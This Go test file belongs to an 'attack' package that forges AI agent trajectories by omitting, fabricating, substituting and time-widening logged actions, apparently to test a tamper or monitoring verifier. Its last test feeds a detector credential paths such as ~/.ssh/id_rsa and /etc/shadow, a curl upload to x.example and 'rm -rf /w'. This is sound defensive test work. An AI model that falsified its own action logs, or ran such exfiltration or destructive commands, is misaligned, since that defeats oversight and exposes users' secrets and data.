package attack

import (
	"errors"
	"reflect"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/agent-trace/agent-trace/pkg/models"
)

var t0 = time.Date(2026, 10, 7, 12, 0, 0, 0, time.UTC)

func at(sec int) time.Time { return t0.Add(time.Duration(sec) * time.Second) }

func sp(s string) *string { return &s }
func ip(n int32) *int32   { return &n }
func tp(sec int) *time.Time {
	x := at(sec)
	return &x
}

// sample is a trajectory shaped like a real session: files, commands with an
// interval and an exit code, a connection, and a write that states its hash.
func sample() models.Trajectory {
	return models.Trajectory{
		{Timestamp: at(0), ActionType: models.FileOpen, Target: "/w/a.txt", Tool: "Read"},
		{Timestamp: at(10), End: tp(14), ActionType: models.ProcessExec, Target: "go test ./...", Tool: "Bash"},
		{Timestamp: at(14), ActionType: models.ProcessExit, Target: "go test ./...", ExitCode: ip(0), Tool: "Bash"},
		{Timestamp: at(20), ActionType: models.FileWrite, Target: "/w/b.txt", OutputHash: sp("sha256:aaaa"), Tool: "Write"},
		{Timestamp: at(30), ActionType: models.NetConnect, Target: "example.com", Tool: "WebFetch"},
		{Timestamp: at(40), End: tp(41), ActionType: models.ProcessExec, Target: "ls -la", Tool: "Bash"},
	}
}

// deepCopy is a trajectory copy that shares nothing with the original, to prove
// a generator did not touch its input.
func deepCopy(t models.Trajectory) models.Trajectory { return clone(t) }

func mustEqual(t *testing.T, got, want models.Trajectory, what string) {
	t.Helper()
	if !reflect.DeepEqual(got, want) {
		t.Errorf("%s changed:\n got %+v\nwant %+v", what, got, want)
	}
}

// --- shared behaviour ---

func TestGeneratorsNeverModifyTheirInput(t *testing.T) {
	in := sample()
	want := deepCopy(in)
	opt := Options{N: 2, Seed: 7}
	if _, _, err := Omit(in, opt); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Fabricate(in, opt); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Substitute(in, SubstituteOptions{Options: opt}); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Widen(in, opt); err != nil {
		t.Fatal(err)
	}
	mustEqual(t, in, want, "the input trajectory")
}

func TestOutputSharesNoPointersWithTheInput(t *testing.T) {
	in := sample()
	out, _, err := Substitute(in, SubstituteOptions{Options: Options{Indices: []int{0}}})
	if err != nil {
		t.Fatal(err)
	}
	*out[1].End = at(999) // mutate the output's interval pointer
	*out[3].OutputHash = "changed"
	if !in[1].End.Equal(at(14)) || *in[3].OutputHash != "sha256:aaaa" {
		t.Error("the output aliased the input's pointers")
	}
}

func TestSameSeedSameMutationAndDifferentSeedsDiffer(t *testing.T) {
	in := sample()
	for name, gen := range map[string]func(Options) (models.Trajectory, Record, error){
		"omit":      func(o Options) (models.Trajectory, Record, error) { return Omit(in, o) },
		"fabricate": func(o Options) (models.Trajectory, Record, error) { return Fabricate(in, o) },
		"substitute": func(o Options) (models.Trajectory, Record, error) {
			return Substitute(in, SubstituteOptions{Options: o})
		},
		"widen": func(o Options) (models.Trajectory, Record, error) { return Widen(in, o) },
	} {
		t.Run(name, func(t *testing.T) {
			a1, r1, err := gen(Options{N: 2, Seed: 11})
			if err != nil {
				t.Fatal(err)
			}
			a2, r2, _ := gen(Options{N: 2, Seed: 11})
			mustEqual(t, a1, a2, "output for the same seed")
			if !reflect.DeepEqual(r1, r2) {
				t.Error("the record differs for the same seed")
			}
			differs := false
			for seed := uint64(0); seed < 40 && !differs; seed++ {
				b, _, _ := gen(Options{N: 2, Seed: seed})
				differs = !reflect.DeepEqual(a1, b)
			}
			if !differs {
				t.Error("forty seeds never produced a different mutation")
			}
		})
	}
}

func TestRequestingMoreMutationsThanAdmittedIsAnError(t *testing.T) {
	in := sample()
	if _, _, err := Omit(in, Options{N: len(in) + 1}); !errors.Is(err, ErrTooMany) {
		t.Errorf("Omit too many: %v", err)
	}
	onlyExec := func(e models.TrajectoryEntry) bool { return e.ActionType == models.ProcessExec }
	if _, _, err := Omit(in, Options{N: 3, Select: onlyExec}); !errors.Is(err, ErrTooMany) {
		t.Errorf("Omit with a selector admitting 2: %v", err)
	}
	if _, _, err := Omit(in, Options{N: 2, Select: onlyExec}); err != nil {
		t.Errorf("Omit exactly the admitted number: %v", err)
	}
	if _, _, err := Substitute(in, SubstituteOptions{Options: Options{N: 2}, Field: FieldExitCode}); !errors.Is(err, ErrTooMany) {
		t.Errorf("Substitute exit codes on a trajectory with one: %v", err)
	}
	if _, _, err := Fabricate(in[:1], Options{N: 1}); !errors.Is(err, ErrTooMany) {
		t.Errorf("Fabricate into a one-claim trajectory: %v", err)
	}
	for _, n := range []int{0, -1} {
		if _, _, err := Omit(in, Options{N: n}); err == nil {
			t.Errorf("N = %d accepted", n)
		}
		if _, _, err := Fabricate(in, Options{N: n}); err == nil {
			t.Errorf("Fabricate N = %d accepted", n)
		}
	}
}

func TestExplicitIndicesOverrideSelection(t *testing.T) {
	in := sample()
	out, rec, err := Omit(in, Options{Indices: []int{3, 1}})
	if err != nil {
		t.Fatal(err)
	}
	if len(out) != len(in)-2 || rec.Mutations[0].OriginalIndex != 1 || rec.Mutations[1].OriginalIndex != 3 {
		t.Errorf("record = %+v", rec.Mutations)
	}
	for _, bad := range [][]int{{-1}, {len(in)}, {1, 1}} {
		if _, _, err := Omit(in, Options{Indices: bad}); err == nil {
			t.Errorf("indices %v accepted", bad)
		}
	}
	// An explicit index that the generator cannot use is an error, not a skip.
	if _, _, err := Substitute(in, SubstituteOptions{Options: Options{Indices: []int{0}}, Field: FieldExitCode}); err == nil {
		t.Error("substituting an exit code on an entry without one was accepted")
	}
}

// --- A1 ---

func TestOmitRemovesExactlyTheRecordedEntries(t *testing.T) {
	in := sample()
	for seed := uint64(0); seed < 30; seed++ {
		out, rec, err := Omit(in, Options{N: 2, Seed: seed})
		if err != nil {
			t.Fatal(err)
		}
		if len(out) != len(in)-2 || len(rec.Mutations) != 2 || rec.Kind != Omission || rec.Seed != seed {
			t.Fatalf("seed %d: %d left, record %+v", seed, len(out), rec)
		}
		gone := map[int]bool{}
		for _, m := range rec.Mutations {
			if m.Index != -1 || m.After != nil || m.Before == nil {
				t.Errorf("an omission records its original and no result: %+v", m)
			}
			if !reflect.DeepEqual(*m.Before, in[m.OriginalIndex]) {
				t.Errorf("the recorded entry is not the original at %d", m.OriginalIndex)
			}
			gone[m.OriginalIndex] = true
		}
		var rest []string
		for i, e := range in {
			if !gone[i] {
				rest = append(rest, e.Target)
			}
		}
		var got []string
		for _, e := range out {
			got = append(got, e.Target)
		}
		if !reflect.DeepEqual(got, rest) {
			t.Errorf("seed %d: remaining %v, want the others in order %v", seed, got, rest)
		}
	}
}

// An omission must not leave a hole in the timeline: what follows the removed
// entry moves earlier by the time it occupied, and durations are kept.
func TestOmitClosesTheGapAndKeepsDurations(t *testing.T) {
	in := sample()
	out, _, err := Omit(in, Options{Indices: []int{1}}) // the 10s..14s command
	if err != nil {
		t.Fatal(err)
	}
	// Entry 1 occupied 4 seconds, so everything after it moves 4s earlier.
	want := []time.Time{at(0), at(10), at(16), at(26), at(36)}
	for i, e := range out {
		if !e.Timestamp.Equal(want[i]) {
			t.Errorf("entry %d at %v, want %v", i, e.Timestamp, want[i])
		}
	}
	last := out[len(out)-1]
	if last.End == nil || last.End.Sub(last.Timestamp) != time.Second {
		t.Errorf("the last entry's duration changed: %v", last.End)
	}
	// Removing a point entry closes the gap to the next one.
	out2, _, _ := Omit(in, Options{Indices: []int{0}})
	if !out2[0].Timestamp.Equal(at(0)) {
		t.Errorf("after dropping the first entry (gap 10s) the next starts at %v, want 0s", out2[0].Timestamp)
	}
	// Removing the last entry shifts nothing.
	out3, _, _ := Omit(in, Options{Indices: []int{5}})
	mustEqual(t, out3, in[:5], "the entries before a removed last entry")
}

// --- A2 ---

func TestFabricateInsertsPlausibleClaimsInsideTheSpan(t *testing.T) {
	in := sample()
	claimed := map[string]bool{}
	for _, e := range in {
		claimed[string(e.ActionType)+"|"+e.Target] = true
	}
	for seed := uint64(0); seed < 40; seed++ {
		out, rec, err := Fabricate(in, Options{N: 3, Seed: seed})
		if err != nil {
			t.Fatal(err)
		}
		if len(out) != len(in)+3 || len(rec.Mutations) != 3 || rec.Kind != Fabrication {
			t.Fatalf("seed %d: %d entries, record %d", seed, len(out), len(rec.Mutations))
		}
		inserted := map[int]bool{}
		for _, m := range rec.Mutations {
			if m.OriginalIndex != -1 || m.Before != nil || m.After == nil {
				t.Errorf("a fabrication records its result and no original: %+v", m)
			}
			if m.Index <= 0 || m.Index >= len(out)-1 {
				t.Errorf("inserted at %d of %d: not inside the trajectory", m.Index, len(out))
			}
			if !reflect.DeepEqual(out[m.Index], *m.After) {
				t.Errorf("the record does not match the output at %d", m.Index)
			}
			if claimed[string(m.After.ActionType)+"|"+m.After.Target] {
				t.Errorf("fabricated %s %s duplicates a real claim", m.After.ActionType, m.After.Target)
			}
			inserted[m.Index] = true
		}
		// The original entries survive, in order.
		var orig models.Trajectory
		for i, e := range out {
			if !inserted[i] {
				orig = append(orig, e)
			}
		}
		mustEqual(t, orig, in, "the original entries")
		// The timeline stays in order.
		for i := 1; i < len(out); i++ {
			if out[i].Timestamp.Before(out[i-1].Timestamp) {
				t.Errorf("seed %d: entry %d is before entry %d", seed, i, i-1)
			}
		}
	}
}

func TestFabricateShapesFollowTheDonor(t *testing.T) {
	hashRE := regexp.MustCompile(`^sha256:[0-9a-f]{64}$`)
	in := models.Trajectory{
		{Timestamp: at(0), ActionType: models.FileWrite, Target: "/w/b.txt", OutputHash: sp("sha256:aaaa"), Tool: "Write"},
		{Timestamp: at(10), End: tp(14), ActionType: models.ProcessExec, Target: "go test", Tool: "Bash"},
		{Timestamp: at(30), ActionType: models.NetConnect, Target: "example.com", Tool: "WebFetch"},
	}
	for seed := uint64(0); seed < 60; seed++ {
		out, rec, err := Fabricate(in, Options{N: 2, Seed: seed})
		if err != nil {
			t.Fatal(err)
		}
		for _, m := range rec.Mutations {
			e := *m.After
			switch e.ActionType {
			case models.FileWrite:
				if !strings.HasPrefix(e.Target, "/w/") || e.Tool != "Write" || e.OutputHash == nil || !hashRE.MatchString(*e.OutputHash) {
					t.Errorf("a fabricated write = %+v", e)
				}
			case models.ProcessExec:
				if e.Tool != "Bash" || e.End == nil || e.End.Sub(e.Timestamp) != 4*time.Second || e.Target == "go test" {
					t.Errorf("a fabricated command = %+v", e)
				}
			case models.NetConnect:
				if e.Tool != "WebFetch" || e.Target == "example.com" || !strings.Contains(e.Target, ".") {
					t.Errorf("a fabricated connection = %+v", e)
				}
			default:
				t.Errorf("unexpected action type %s", e.ActionType)
			}
		}
		_ = out
	}
}

func TestFabricateAvoidsForbiddenTargets(t *testing.T) {
	in := sample()
	avoid := map[string]bool{}
	for _, n := range fileNames {
		avoid["/w/"+n] = true
	}
	for seed := uint64(0); seed < 40; seed++ {
		_, rec, err := Fabricate(in, Options{N: 4, Seed: seed, Avoid: avoid})
		if err != nil {
			t.Fatal(err)
		}
		for _, m := range rec.Mutations {
			if avoid[m.After.Target] {
				t.Fatalf("seed %d produced the forbidden target %s", seed, m.After.Target)
			}
		}
	}
}

// --- A3 ---

// changedFields lists the content fields that differ between two entries.
func changedFields(a, b models.TrajectoryEntry) []string {
	var out []string
	if a.Target != b.Target {
		out = append(out, FieldTarget)
	}
	if !reflect.DeepEqual(a.OutputHash, b.OutputHash) {
		out = append(out, FieldOutputHash)
	}
	if !reflect.DeepEqual(a.ExitCode, b.ExitCode) {
		out = append(out, FieldExitCode)
	}
	if !reflect.DeepEqual(a.RequestHash, b.RequestHash) {
		out = append(out, FieldRequestHash)
	}
	if !a.Timestamp.Equal(b.Timestamp) || !reflect.DeepEqual(a.End, b.End) || a.ActionType != b.ActionType || a.Tool != b.Tool {
		out = append(out, "something that must not change")
	}
	return out
}

func TestSubstituteChangesExactlyOneFieldPerEntry(t *testing.T) {
	in := sample()
	seen := map[string]bool{}
	for seed := uint64(0); seed < 80; seed++ {
		out, rec, err := Substitute(in, SubstituteOptions{Options: Options{N: 3, Seed: seed}})
		if err != nil {
			t.Fatal(err)
		}
		if len(out) != len(in) || len(rec.Mutations) != 3 || rec.Kind != Substitution {
			t.Fatalf("seed %d: %+v", seed, rec)
		}
		changed := map[int]bool{}
		for _, m := range rec.Mutations {
			changed[m.OriginalIndex] = true
			if m.Index != m.OriginalIndex || m.Old == m.New || m.Old == "" || m.New == "" {
				t.Errorf("bad record %+v", m)
			}
			fs := changedFields(in[m.OriginalIndex], out[m.OriginalIndex])
			if len(fs) != 1 || fs[0] != m.Field {
				t.Errorf("seed %d entry %d: changed %v, record says %s", seed, m.OriginalIndex, fs, m.Field)
			}
			seen[m.Field] = true
		}
		for i := range in {
			if !changed[i] {
				mustEqual(t, models.Trajectory{out[i]}, models.Trajectory{in[i]}, "an entry that was not chosen")
			}
		}
	}
	for _, f := range []string{FieldTarget, FieldOutputHash, FieldExitCode} {
		if !seen[f] {
			t.Errorf("eighty seeds never substituted %s", f)
		}
	}
}

func TestSubstituteRestrictsToTheRequestedField(t *testing.T) {
	in := sample()
	out, rec, err := Substitute(in, SubstituteOptions{Options: Options{N: 1, Seed: 1}, Field: FieldOutputHash})
	if err != nil || rec.Mutations[0].Field != FieldOutputHash || rec.Mutations[0].OriginalIndex != 3 {
		t.Fatalf("record %+v, err %v", rec.Mutations, err)
	}
	if !strings.HasPrefix(*out[3].OutputHash, "sha256:") || *out[3].OutputHash == "sha256:aaaa" {
		t.Errorf("hash = %s", *out[3].OutputHash)
	}
	out, rec, _ = Substitute(in, SubstituteOptions{Options: Options{N: 1}, Field: FieldExitCode})
	if *out[2].ExitCode != 1 || rec.Mutations[0].Old != "0" || rec.Mutations[0].New != "1" {
		t.Errorf("exit code %v, record %+v", *out[2].ExitCode, rec.Mutations[0])
	}
	if _, _, err := Substitute(in, SubstituteOptions{Options: Options{N: 1}, Field: "timestamp"}); err == nil {
		t.Error("an unknown field was accepted")
	}
}

func TestSubstituteTargetsAreBenignAndKindPreserving(t *testing.T) {
	in := sample()
	for seed := uint64(0); seed < 60; seed++ {
		out, rec, err := Substitute(in, SubstituteOptions{Options: Options{N: 6, Seed: seed}, Field: FieldTarget})
		if err != nil {
			t.Fatal(err)
		}
		for i, e := range out {
			switch {
			case isFile(e.ActionType):
				if !strings.HasPrefix(e.Target, "/w/") {
					t.Errorf("a substituted file target left the directory: %s", e.Target)
				}
			case e.ActionType == models.NetConnect:
				if !strings.Contains(e.Target, ".") {
					t.Errorf("a substituted host = %s", e.Target)
				}
			}
			if e.Target == in[i].Target {
				t.Errorf("entry %d kept its target", i)
			}
		}
		_ = rec
	}
}

func TestSubstituteHonoursAvoid(t *testing.T) {
	in := models.Trajectory{{Timestamp: at(0), ActionType: models.ProcessExec, Target: "rm -rf /w", Tool: "Bash"}}
	avoid := map[string]bool{}
	for _, c := range benign[:len(benign)-1] {
		avoid[c] = true
	}
	for seed := uint64(0); seed < 20; seed++ {
		out, _, err := Substitute(in, SubstituteOptions{Options: Options{N: 1, Seed: seed, Avoid: avoid}, Field: FieldTarget})
		if err != nil {
			t.Fatal(err)
		}
		if avoid[out[0].Target] || out[0].Target == "rm -rf /w" {
			t.Fatalf("seed %d produced %q", seed, out[0].Target)
		}
	}
}

// --- A4 ---

func TestWidenStretchesTheIntervalOverItsNeighbours(t *testing.T) {
	in := sample()
	out, rec, err := Widen(in, Options{Indices: []int{3}}) // the write at 20s between 14s and 30s
	if err != nil {
		t.Fatal(err)
	}
	m := rec.Mutations[0]
	if m.Kind != IntervalWidening || m.Field != FieldInterval || m.OriginalIndex != 3 || m.Old == m.New {
		t.Errorf("record %+v", m)
	}
	e := out[3]
	if !e.Timestamp.Equal(at(14)) || e.End == nil || !e.End.Equal(at(30)) {
		t.Errorf("interval = [%v, %v], want [14s, 30s]", e.Timestamp, e.End)
	}
	if e.Target != in[3].Target || e.ActionType != in[3].ActionType {
		t.Error("widening changed more than the interval")
	}
	// The ends of the trajectory widen by a second on the open side.
	out, _, _ = Widen(in, Options{Indices: []int{0}})
	if !out[0].Timestamp.Equal(at(-1)) || !out[0].End.Equal(at(14)) {
		t.Errorf("first entry = [%v, %v]", out[0].Timestamp, out[0].End)
	}
	out, _, _ = Widen(in, Options{Indices: []int{5}})
	if !out[5].Timestamp.Equal(at(30)) || !out[5].End.Equal(at(42)) {
		t.Errorf("last entry = [%v, %v]", out[5].Timestamp, out[5].End)
	}
}

func TestWidenOnlyChoosesEntriesItChanges(t *testing.T) {
	// A single entry already covers its whole neighbourhood only if it has none,
	// and even then the open sides widen, so every entry is changeable. Two
	// entries already spanning each other's range are not.
	in := models.Trajectory{
		{Timestamp: at(0), End: tp(100), ActionType: models.ProcessExec, Target: "long"},
		{Timestamp: at(10), End: tp(20), ActionType: models.ProcessExec, Target: "inner"},
	}
	_, rec, err := Widen(in, Options{N: 2})
	if err != nil {
		t.Fatalf("both entries are changeable at the trajectory's ends: %v", err)
	}
	for _, m := range rec.Mutations {
		if m.Old == m.New {
			t.Errorf("a no-op widening was recorded: %+v", m)
		}
	}
	// With explicit indices the same rule applies: a no-op is refused.
	mid := models.Trajectory{
		{Timestamp: at(0), ActionType: models.FileOpen, Target: "/a"},
		{Timestamp: at(5), End: tp(8), ActionType: models.FileOpen, Target: "/b"},
		{Timestamp: at(6), ActionType: models.FileOpen, Target: "/c"},
		{Timestamp: at(9), ActionType: models.FileOpen, Target: "/d"},
	}
	if _, _, err := Widen(mid, Options{Indices: []int{1}}); err != nil {
		t.Fatalf("entry 1 widens to [0, 8]: %v", err)
	}
	wide := models.Trajectory{
		{Timestamp: at(0), End: tp(9), ActionType: models.FileOpen, Target: "/a"},
		{Timestamp: at(0), End: tp(9), ActionType: models.FileOpen, Target: "/b"},
		{Timestamp: at(0), End: tp(9), ActionType: models.FileOpen, Target: "/c"},
	}
	if _, _, err := Widen(wide, Options{Indices: []int{1}}); err == nil {
		t.Error("widening an entry that already covers its neighbours was accepted")
	}
}

// --- Sensitive ---

func TestSensitiveRecognisesCredentialsAndExfiltrationShapes(t *testing.T) {
	cases := []struct {
		e    models.TrajectoryEntry
		want bool
	}{
		{models.TrajectoryEntry{ActionType: models.FileOpen, Target: "/home/u/.ssh/id_rsa"}, true},
		{models.TrajectoryEntry{ActionType: models.FileWrite, Target: "/home/u/.aws/credentials"}, true},
		{models.TrajectoryEntry{ActionType: models.FileOpen, Target: "/etc/shadow"}, true},
		{models.TrajectoryEntry{ActionType: models.FileOpen, Target: "/w/project/.env"}, true},
		{models.TrajectoryEntry{ActionType: models.FileOpen, Target: "/w/main.go"}, false},
		{models.TrajectoryEntry{ActionType: models.ProcessExec, Target: "curl -s https://x.example/up -d @data"}, true},
		{models.TrajectoryEntry{ActionType: models.ProcessExec, Target: "ssh host ls"}, true},
		{models.TrajectoryEntry{ActionType: models.ProcessExec, Target: "go test ./..."}, false},
		{models.TrajectoryEntry{ActionType: models.NetConnect, Target: "pastebin.example"}, true},
		{models.TrajectoryEntry{ActionType: models.NetConnect, Target: "127.0.0.1:8080"}, false},
		{models.TrajectoryEntry{ActionType: models.NetConnect, Target: "localhost"}, false},
	}
	for _, c := range cases {
		if got := Sensitive(c.e); got != c.want {
			t.Errorf("Sensitive(%s %s) = %v, want %v", c.e.ActionType, c.e.Target, got, c.want)
		}
	}
}
